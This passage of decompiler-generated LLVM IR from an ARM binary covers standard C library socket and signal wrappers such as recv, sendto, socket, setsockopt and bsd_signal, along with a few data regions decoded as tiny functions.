  store i32 %v3_11bfc, i32* @r4, align 4
  store i32 %v9_11bfc, i32* @r6, align 4
  store i32 %v12_11bfc, i32* @r7, align 4
  store i32 %v15_11bfc, i32* @r8, align 4
  %v0_11c28 = call i32 @__sys_recv()
  br label %dec_label_pc_11c2c

dec_label_pc_11c2c:                               ; preds = %entry.dec_label_pc_11c2c_crit_edge, %dec_label_pc_11c24
  %v0_11c2c = call i32 @__libc_enable_asynccancel()
  %v0_11c30 = load i32, i32* @r6, align 4
  store i32 %v0_11c30, i32* @r1, align 4
  store i32 %v0_11c2c, i32* @r5, align 4
  %v0_11c40 = load i32, i32* @r4, align 4
  store i32 %v0_11c40, i32* @r0, align 4
  %v0_11c44 = call i32 @__sys_recv()
  store i32 %v0_11c44, i32* @r4, align 4
  %v0_11c4c = load i32, i32* @r5, align 4
  %v1_11c50 = call i32 @__libc_disable_asynccancel(i32 %v0_11c4c)
  %v0_11c54 = load i32, i32* @r4, align 4
  %v2_11c58 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11c58, i32* @r4, align 4
  store i32 %v6_11bfc, i32* @r5, align 4
  store i32 %v9_11bfc, i32* @r6, align 4
  store i32 %v12_11bfc, i32* @r7, align 4
  store i32 %v15_11bfc, i32* @r8, align 4
  store i32 %v18_11bfc, i32* @lr, align 4
  ret i32 %v0_11c54

; uselistorder directives
  uselistorder label %dec_label_pc_11c2c, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11c68 = load i32, i32* @r4, align 4
  store i32 %v3_11c68, i32* %stack_var_-16, align 4
  %v0_11c7c = load i32, i32* @r0, align 4
  store i32 %v0_11c7c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11c7c, -4095
  br i1 %tmp, label %dec_label_pc_11ca4, label %dec_label_pc_11c8c

dec_label_pc_11c8c:                               ; preds = %entry
  %v0_11c90 = call i32 @__aeabi_read_tp()
  %v3_11c94 = load i16, i16* @global_var_22068.345, align 2
  %v4_11c94 = sext i16 %v3_11c94 to i32
  %v0_11c98 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c98 = sub i32 0, %v0_11c98
  store i32 %v1_11c98, i32* %r2.global-to-local, align 4
  %v3_11c9c = add i32 %v4_11c94, %v0_11c90
  %v4_11c9c = inttoptr i32 %v3_11c9c to i32*
  store i32 %v1_11c98, i32* %v4_11c9c, align 4
  %v2_11ca4.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11ca4

dec_label_pc_11ca4:                               ; preds = %entry, %dec_label_pc_11c8c
  %v1_11ca8 = phi i32 [ %v0_11c7c, %entry ], [ -1, %dec_label_pc_11c8c ]
  %v2_11ca4 = phi i32 [ %v3_11c68, %entry ], [ %v2_11ca4.pre, %dec_label_pc_11c8c ]
  store i32 %v2_11ca4, i32* @r4, align 4
  ret i32 %v1_11ca8

; uselistorder directives
  uselistorder i32 %v0_11c7c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11ca4, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11cb0 = load i32, i32* @r4, align 4
  store i32 %v3_11cb0, i32* %stack_var_-32, align 4
  %v6_11cb0 = load i32, i32* @r5, align 4
  %v9_11cb0 = load i32, i32* @r6, align 4
  %v12_11cb0 = load i32, i32* @r7, align 4
  %v15_11cb0 = load i32, i32* @r8, align 4
  %v18_11cb0 = load i32, i32* @sb, align 4
  %v21_11cb0 = load i32, i32* @sl, align 4
  %v24_11cb0 = load i32, i32* @lr, align 4
  %v4_11cc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 12776) to i32*), align 4
  %v2_11cc8 = icmp eq i32 %v4_11cc0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11cc8, label %dec_label_pc_11ce8, label %dec_label_pc_11cf4

dec_label_pc_11ce8:                               ; preds = %entry
  store i32 %v3_11cb0, i32* @r4, align 4
  store i32 %v12_11cb0, i32* @r7, align 4
  store i32 %v15_11cb0, i32* @r8, align 4
  store i32 %v18_11cb0, i32* %sb.global-to-local, align 4
  %v0_11cf0 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_11cf4

dec_label_pc_11cf4:                               ; preds = %entry, %dec_label_pc_11ce8
  %v0_11cf4 = call i32 @__libc_enable_asynccancel()
  %v0_11cf8 = load i32, i32* @r7, align 4
  store i32 %v0_11cf8, i32* @r1, align 4
  store i32 %v0_11cf4, i32* @r5, align 4
  %v0_11d08 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11d08, i32* @r0, align 4
  %v0_11d10 = call i32 @__sys_recvfrom()
  store i32 %v0_11d10, i32* @r4, align 4
  %v0_11d18 = load i32, i32* @r5, align 4
  %v1_11d1c = call i32 @__libc_disable_asynccancel(i32 %v0_11d18)
  %v0_11d20 = load i32, i32* @r4, align 4
  %v2_11d28 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11d28, i32* @r4, align 4
  store i32 %v6_11cb0, i32* @r5, align 4
  store i32 %v9_11cb0, i32* @r6, align 4
  store i32 %v12_11cb0, i32* @r7, align 4
  store i32 %v15_11cb0, i32* @r8, align 4
  store i32 %v18_11cb0, i32* @sb, align 4
  store i32 %v21_11cb0, i32* @sl, align 4
  store i32 %v24_11cb0, i32* @lr, align 4
  ret i32 %v0_11d20

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11cf4, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d38 = load i32, i32* @r7, align 4
  store i32 %v3_11d38, i32* %stack_var_-8, align 4
  %v0_11d44 = load i32, i32* @r0, align 4
  store i32 %v0_11d44, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d44, -4095
  br i1 %tmp, label %dec_label_pc_11d6c, label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %entry
  %v0_11d58 = call i32 @__aeabi_read_tp()
  %v3_11d5c = load i16, i16* @global_var_22068.345, align 2
  %v4_11d5c = sext i16 %v3_11d5c to i32
  store i32 %v4_11d5c, i32* @r3, align 4
  %v0_11d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_11d60 = sub i32 0, %v0_11d60
  store i32 %v1_11d60, i32* %r2.global-to-local, align 4
  %v3_11d64 = add i32 %v4_11d5c, %v0_11d58
  %v4_11d64 = inttoptr i32 %v3_11d64 to i32*
  store i32 %v1_11d60, i32* %v4_11d64, align 4
  %v2_11d6c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11d6c

dec_label_pc_11d6c:                               ; preds = %entry, %dec_label_pc_11d54
  %v1_11d70 = phi i32 [ %v0_11d44, %entry ], [ -1, %dec_label_pc_11d54 ]
  %v2_11d6c = phi i32 [ %v3_11d38, %entry ], [ %v2_11d6c.pre, %dec_label_pc_11d54 ]
  store i32 %v2_11d6c, i32* @r7, align 4
  ret i32 %v1_11d70

; uselistorder directives
  uselistorder i32 %v0_11d44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d6c, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11d74:
  %v0_11d74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d74, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11d74
  %v2_11d78 = load i32, i32* @r4, align 4
  %v5_11d78 = mul i32 %v2_11d78, 64
  %v6_11d78 = and i32 %v5_11d78, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11d74, %bb
  %v7_11d78 = phi i32 [ %arg1, %dec_label_pc_11d74 ], [ %v6_11d78, %bb ]
  ret i32 %v7_11d78

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11d80 = load i32, i32* @r4, align 4
  store i32 %v3_11d80, i32* %stack_var_-24, align 4
  %v6_11d80 = load i32, i32* @r5, align 4
  %v9_11d80 = load i32, i32* @r6, align 4
  %v12_11d80 = load i32, i32* @r7, align 4
  %v15_11d80 = load i32, i32* @r8, align 4
  %v18_11d80 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @ip, align 4
  %v4_11d8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 12776) to i32*), align 4
  %v2_11d90 = icmp eq i32 %v4_11d8c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11d90, label %dec_label_pc_11da8, label %entry.dec_label_pc_11db0_crit_edge

entry.dec_label_pc_11db0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11db0

dec_label_pc_11da8:                               ; preds = %entry
  store i32 %v3_11d80, i32* @r4, align 4
  store i32 %v9_11d80, i32* @r6, align 4
  store i32 %v12_11d80, i32* @r7, align 4
  store i32 %v15_11d80, i32* @r8, align 4
  %v0_11dac = call i32 @__sys_send()
  br label %dec_label_pc_11db0

dec_label_pc_11db0:                               ; preds = %entry.dec_label_pc_11db0_crit_edge, %dec_label_pc_11da8
  %v0_11db0 = call i32 @__libc_enable_asynccancel()
  %v0_11db4 = load i32, i32* @r6, align 4
  store i32 %v0_11db4, i32* @r1, align 4
  store i32 %v0_11db0, i32* @r5, align 4
  %v0_11dc0 = load i32, i32* @r8, align 4
  store i32 %v0_11dc0, i32* @r3, align 4
  %v0_11dc4 = load i32, i32* @r4, align 4
  store i32 %v0_11dc4, i32* @r0, align 4
  %v0_11dc8 = call i32 @__sys_send()
  store i32 %v0_11dc8, i32* @r4, align 4
  %v0_11dd0 = load i32, i32* @r5, align 4
  %v1_11dd4 = call i32 @__libc_disable_asynccancel(i32 %v0_11dd0)
  %v0_11dd8 = load i32, i32* @r4, align 4
  %v2_11ddc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11ddc, i32* @r4, align 4
  store i32 %v6_11d80, i32* @r5, align 4
  store i32 %v9_11d80, i32* @r6, align 4
  store i32 %v12_11d80, i32* @r7, align 4
  store i32 %v15_11d80, i32* @r8, align 4
  store i32 %v18_11d80, i32* @lr, align 4
  ret i32 %v0_11dd8

; uselistorder directives
  uselistorder label %dec_label_pc_11db0, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11dec = load i32, i32* @r4, align 4
  store i32 %v3_11dec, i32* %stack_var_-16, align 4
  %v0_11e00 = load i32, i32* @r0, align 4
  store i32 %v0_11e00, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11e00, -4095
  br i1 %tmp, label %dec_label_pc_11e28, label %dec_label_pc_11e10

dec_label_pc_11e10:                               ; preds = %entry
  %v0_11e14 = call i32 @__aeabi_read_tp()
  %v3_11e18 = load i16, i16* @global_var_22068.345, align 2
  %v4_11e18 = sext i16 %v3_11e18 to i32
  %v0_11e1c = load i32, i32* %r2.global-to-local, align 4
  %v1_11e1c = sub i32 0, %v0_11e1c
  store i32 %v1_11e1c, i32* %r2.global-to-local, align 4
  %v3_11e20 = add i32 %v4_11e18, %v0_11e14
  %v4_11e20 = inttoptr i32 %v3_11e20 to i32*
  store i32 %v1_11e1c, i32* %v4_11e20, align 4
  %v2_11e28.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11e28

dec_label_pc_11e28:                               ; preds = %entry, %dec_label_pc_11e10
  %v1_11e2c = phi i32 [ %v0_11e00, %entry ], [ -1, %dec_label_pc_11e10 ]
  %v2_11e28 = phi i32 [ %v3_11dec, %entry ], [ %v2_11e28.pre, %dec_label_pc_11e10 ]
  store i32 %v2_11e28, i32* @r4, align 4
  ret i32 %v1_11e2c

; uselistorder directives
  uselistorder i32 %v0_11e00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11e28, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11e30:
  %v0_11e30 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e30, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11e30
  %v2_11e34 = load i32, i32* @r8, align 4
  %v5_11e34 = sdiv i32 %v2_11e34, 16
  %v6_11e34 = and i32 %v5_11e34, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11e30, %bb
  %v7_11e34 = phi i32 [ %arg1, %dec_label_pc_11e30 ], [ %v6_11e34, %bb ]
  ret i32 %v7_11e34

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11e38 = load i32, i32* @r4, align 4
  store i32 %v3_11e38, i32* %stack_var_-32, align 4
  %v6_11e38 = load i32, i32* @r5, align 4
  %v9_11e38 = load i32, i32* @r6, align 4
  %v12_11e38 = load i32, i32* @r7, align 4
  %v15_11e38 = load i32, i32* @r8, align 4
  %v18_11e38 = load i32, i32* @sb, align 4
  %v21_11e38 = load i32, i32* @sl, align 4
  %v24_11e38 = load i32, i32* @lr, align 4
  %v4_11e48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 12776) to i32*), align 4
  %v2_11e50 = icmp eq i32 %v4_11e48, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11e50, label %dec_label_pc_11e70, label %dec_label_pc_11e7c

dec_label_pc_11e70:                               ; preds = %entry
  store i32 %v3_11e38, i32* @r4, align 4
  store i32 %v12_11e38, i32* @r7, align 4
  store i32 %v15_11e38, i32* @r8, align 4
  store i32 %v18_11e38, i32* %sb.global-to-local, align 4
  %v0_11e78 = call i32 @__sys_sendto()
  br label %dec_label_pc_11e7c

dec_label_pc_11e7c:                               ; preds = %entry, %dec_label_pc_11e70
  %v0_11e7c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11e7c, i32* @r5, align 4
  %v0_11e90 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11e90, i32* @r0, align 4
  %v0_11e98 = call i32 @__sys_sendto()
  store i32 %v0_11e98, i32* @r4, align 4
  %v0_11ea0 = load i32, i32* @r5, align 4
  %v1_11ea4 = call i32 @__libc_disable_asynccancel(i32 %v0_11ea0)
  %v0_11ea8 = load i32, i32* @r4, align 4
  %v2_11eb0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11eb0, i32* @r4, align 4
  store i32 %v6_11e38, i32* @r5, align 4
  store i32 %v9_11e38, i32* @r6, align 4
  store i32 %v12_11e38, i32* @r7, align 4
  store i32 %v15_11e38, i32* @r8, align 4
  store i32 %v18_11e38, i32* @sb, align 4
  store i32 %v21_11e38, i32* @sl, align 4
  store i32 %v24_11e38, i32* @lr, align 4
  ret i32 %v0_11ea8

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11e7c, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11ec0 = load i32, i32* @r4, align 4
  store i32 %v3_11ec0, i32* %stack_var_-12, align 4
  %v0_11ed0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11ed0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ed0, -4095
  br i1 %tmp, label %dec_label_pc_11ef8, label %dec_label_pc_11ee0

dec_label_pc_11ee0:                               ; preds = %entry
  %v0_11ee4 = call i32 @__aeabi_read_tp()
  %v3_11ee8 = load i16, i16* @global_var_22068.345, align 2
  %v4_11ee8 = sext i16 %v3_11ee8 to i32
  store i32 %v4_11ee8, i32* @r3, align 4
  %v0_11eec = load i32, i32* %r2.global-to-local, align 4
  %v1_11eec = sub i32 0, %v0_11eec
  store i32 %v1_11eec, i32* %r2.global-to-local, align 4
  %v3_11ef0 = add i32 %v4_11ee8, %v0_11ee4
  %v4_11ef0 = inttoptr i32 %v3_11ef0 to i32*
  store i32 %v1_11eec, i32* %v4_11ef0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11ef8.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11ef8

dec_label_pc_11ef8:                               ; preds = %entry, %dec_label_pc_11ee0
  %v1_11efc = phi i32 [ %v0_11ed0, %entry ], [ -1, %dec_label_pc_11ee0 ]
  %v2_11ef8 = phi i32 [ %v3_11ec0, %entry ], [ %v2_11ef8.pre, %dec_label_pc_11ee0 ]
  store i32 %v2_11ef8, i32* @r4, align 4
  ret i32 %v1_11efc

; uselistorder directives
  uselistorder i32 %v0_11ed0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ef8, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11f00:
  %v0_11f00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f00, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11f00
  %v2_11f04 = load i32, i32* @r8, align 4
  %v4_11f04 = lshr i32 %v2_11f04, %arg2
  %v5_11f04 = sub i32 32, %arg2
  %v6_11f04 = shl i32 %v2_11f04, %v5_11f04
  %v7_11f04 = or i32 %v6_11f04, %v4_11f04
  %v9_11f04 = and i32 %v7_11f04, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11f00, %bb
  %v10_11f04 = phi i32 [ %arg1, %dec_label_pc_11f00 ], [ %v9_11f04, %bb ]
  ret i32 %v10_11f04

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f08 = load i32, i32* @r7, align 4
  store i32 %v3_11f08, i32* %stack_var_-8, align 4
  %v0_11f14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f14, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f14, -4095
  br i1 %tmp, label %dec_label_pc_11f3c, label %dec_label_pc_11f24

dec_label_pc_11f24:                               ; preds = %entry
  %v0_11f28 = call i32 @__aeabi_read_tp()
  %v3_11f2c = load i16, i16* @global_var_22068.345, align 2
  %v4_11f2c = sext i16 %v3_11f2c to i32
  store i32 %v4_11f2c, i32* @r3, align 4
  %v0_11f30 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f30 = sub i32 0, %v0_11f30
  store i32 %v1_11f30, i32* %r2.global-to-local, align 4
  %v3_11f34 = add i32 %v4_11f2c, %v0_11f28
  %v4_11f34 = inttoptr i32 %v3_11f34 to i32*
  store i32 %v1_11f30, i32* %v4_11f34, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11f3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11f3c

dec_label_pc_11f3c:                               ; preds = %entry, %dec_label_pc_11f24
  %v1_11f40 = phi i32 [ %v0_11f14, %entry ], [ -1, %dec_label_pc_11f24 ]
  %v2_11f3c = phi i32 [ %v3_11f08, %entry ], [ %v2_11f3c.pre, %dec_label_pc_11f24 ]
  store i32 %v2_11f3c, i32* @r7, align 4
  ret i32 %v1_11f40

; uselistorder directives
  uselistorder i32 %v0_11f14, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f3c, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11f44:
  %v0_11f44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f44, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11f44
  %v2_11f48 = load i32, i32* @r4, align 4
  %v8_11f48 = lshr i32 %v2_11f48, %arg2
  %v9_11f48 = and i32 %v8_11f48, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11f44, %bb
  %v10_11f48 = phi i32 [ %arg1, %dec_label_pc_11f44 ], [ %v9_11f48, %bb ]
  ret i32 %v10_11f48

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_11f64, label %dec_label_pc_11f5c

dec_label_pc_11f5c:                               ; preds = %entry
  %v7_11f60 = icmp slt i32 %arg2, 65
  br i1 %v7_11f60, label %dec_label_pc_11f80, label %dec_label_pc_11f64

dec_label_pc_11f64:                               ; preds = %dec_label_pc_11f5c, %entry
  %v0_11f68 = call i32 @__aeabi_read_tp()
  %v3_11f6c = load i16, i16* @global_var_22068.345, align 2
  %v4_11f6c = sext i16 %v3_11f6c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11f78 = add i32 %v4_11f6c, %v0_11f68
  %v4_11f78 = inttoptr i32 %v3_11f78 to i32*
  store i32 22, i32* %v4_11f78, align 4
  %v0_11f88.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11f88

dec_label_pc_11f80:                               ; preds = %dec_label_pc_11f5c
  %v0_11f80 = call i32 @__sigaddset()
  store i32 %v0_11f80, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11f88

dec_label_pc_11f88:                               ; preds = %dec_label_pc_11f64, %dec_label_pc_11f80
  %v0_11f88 = phi i32 [ %v0_11f88.pre, %dec_label_pc_11f64 ], [ %v0_11f80, %dec_label_pc_11f80 ]
  ret i32 %v0_11f88

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11f88, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_11fa4 = add i32 %tmp, 4
  %v3_11fa4 = inttoptr i32 %v2_11fa4 to i32*
  store i32 0, i32* %v3_11fa4, align 4
  %v1_11fa8 = load i32, i32* %r3.global-to-local, align 4
  %v2_11fa8 = inttoptr i32 %v1_11fa8 to i32*
  store i32 0, i32* %v2_11fa8, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11fb0 = load i32, i32* @r4, align 4
  store i32 %v3_11fb0, i32* %stack_var_-16, align 4
  %v6_11fb0 = load i32, i32* @r5, align 4
  %v9_11fb0 = load i32, i32* @r6, align 4
  %v7_11fb8 = icmp eq i32 %arg2, -1
  br i1 %v7_11fb8, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_11fc0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_11fdc

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_11fe4

dec_label_pc_11fdc:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r6, align 4
  %v7_11fe0 = icmp slt i32 %arg1, 65
  br i1 %v7_11fe0, label %dec_label_pc_12000, label %dec_label_pc_11fe4

dec_label_pc_11fe4:                               ; preds = %.thread16, %dec_label_pc_11fdc
  %v0_11fe8 = call i32 @__aeabi_read_tp()
  %v3_11fec = load i16, i16* @global_var_22068.345, align 2
  %v4_11fec = sext i16 %v3_11fec to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11ff8 = add i32 %v4_11fec, %v0_11fe8
  %v4_11ff8 = inttoptr i32 %v3_11ff8 to i32*
  store i32 22, i32* %v4_11ff8, align 4
  %v0_12058.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_12000:                               ; preds = %dec_label_pc_11fdc
  %v2_12000 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12000, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_12008 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_12008, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_12018 = call i32 @__sigaddset()
  %v0_12020 = load i32, i32* @r5, align 4
  store i32 %v0_12020, i32* %r1.global-to-local, align 4
  %v0_12024 = load i32, i32* @r6, align 4
  %v2_12024 = add i32 %v0_12024, 11872
  %v2_12028 = call i32 @__GI___sigismember(i32 %v2_12024, i32 %v0_12020)
  store i32 %v2_12000, i32* %r1.global-to-local, align 4
  %v0_1203c = load i32, i32* @r5, align 4
  %v3_12048 = call i32 @__libc_sigaction(i32 %v0_1203c, i32 %v2_12000, i32 %v2_11fc0)
  %v1_1204c = icmp slt i32 %v3_12048, 0
  br i1 %v1_1204c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_12000
  %v5_12050 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_12050, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_12000
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_11fe4, %bb32
  %v0_12058 = phi i32 [ %v5_12050, %bb31 ], [ %v0_12058.pre, %dec_label_pc_11fe4 ], [ -1, %bb32 ]
  %v2_12060 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12060, i32* @r4, align 4
  store i32 %v6_11fb0, i32* @r5, align 4
  store i32 %v9_11fb0, i32* @r6, align 4
  ret i32 %v0_12058

; uselistorder directives
  uselistorder i32 %v2_12000, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11fe4, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12074 = add i32 %arg2, -1
  %v3_12078 = udiv i32 %v1_12074, 32
  %v4_1207c = mul nuw nsw i32 %v3_12078, 4
  %v5_1207c = add i32 %v4_1207c, %arg1
  %v6_1207c = inttoptr i32 %v5_1207c to i32*
  %v7_1207c = load i32, i32* %v6_1207c, align 4
  %v1_12080 = urem i32 %v1_12074, 32
  %v7_12088 = shl i32 1, %v1_12080
  %v8_12088 = and i32 %v7_1207c, %v7_12088
  %v10_12088 = icmp ne i32 %v8_12088, 0
  %. = zext i1 %v10_12088 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_12074, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_12098 = load i32, i32* @r1, align 4
  %v1_12098 = add i32 %v0_12098, -1
  %v3_1209c = udiv i32 %v1_12098, 32
  %v0_120a0 = load i32, i32* @r0, align 4
  %v4_120a0 = mul nuw nsw i32 %v3_1209c, 4
  %v5_120a0 = add i32 %v0_120a0, %v4_120a0
  %v6_120a0 = inttoptr i32 %v5_120a0 to i32*
  %v7_120a0 = load i32, i32* %v6_120a0, align 4
  %v1_120a4 = urem i32 %v1_12098, 32
  %v7_120ac = shl i32 1, %v1_120a4
  %v8_120ac = or i32 %v7_120a0, %v7_120ac
  store i32 %v8_120ac, i32* %v6_120a0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12098, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_120bc = add i32 %arg2, -1
  %v3_120c0 = udiv i32 %v1_120bc, 32
